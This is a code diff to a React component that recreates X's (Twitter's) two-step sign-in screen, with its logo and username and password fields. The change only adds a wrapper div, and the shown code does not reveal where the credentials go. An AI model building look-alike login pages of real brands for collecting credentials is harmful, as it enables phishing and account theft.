@@ -134,36 +134,37 @@ export default function TwitterLoginPage() {
         .back-link:hover { text-decoration: underline; }
       `}</style>
 
-      <div className="login-container">
-        {step === 1 ? (
-          <div>
-            <img className="logo" src="/logos/x_logo.svg" alt="X" />
-            <h2>Sign in to X</h2>
-            <input
-              type="text"
-              placeholder="Phone, email, or username"
-              value={username}
-              onChange={(e) => setUsername(e.target.value)}
-              onKeyDown={(e) => e.key === 'Enter' && handleNext()}
-            />
-            <div className="feedback">{feedback}</div>
-            <button onClick={handleNext}>Next</button>
-          </div>
-        ) : (
-          <div>
-            <h2>Enter your password</h2>
-            <input
-              type="password"
-              placeholder="Password"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
-            />
-            <div className="feedback">{feedback}</div>
-            <button onClick={handleLogin}>Log in</button>
-            <div className="back-link" onClick={handleBack}>← Back</div>
-          </div>
-        )}
+      <div className="login-page twitter">
+        <div className="login-container">
+          {step === 1 ? (
+            <div>
+              <img className="logo" src="/logos/x_logo.svg" alt="X" />
+              <h2>Sign in to X</h2>
+              <input
+                type="text"
+                placeholder="Phone, email, or username"
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
+                onKeyDown={(e) => e.key === 'Enter' && handleNext()}
+              />
+              <div className="feedback">{feedback}</div>
+              <button onClick={handleNext}>Next</button>
+            </div>
+          ) : (
+            <div>
+              <h2>Enter your password</h2>
+              <input
+                type="password"
+                placeholder="Password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
+              />
+              <div className="feedback">{feedback}</div>
+              <button onClick={handleLogin}>Log in</button>
+              <div className="back-link" onClick={handleBack}>← Back</div>
+            </div>
+          )}</div>
       </div>
     </>
   );
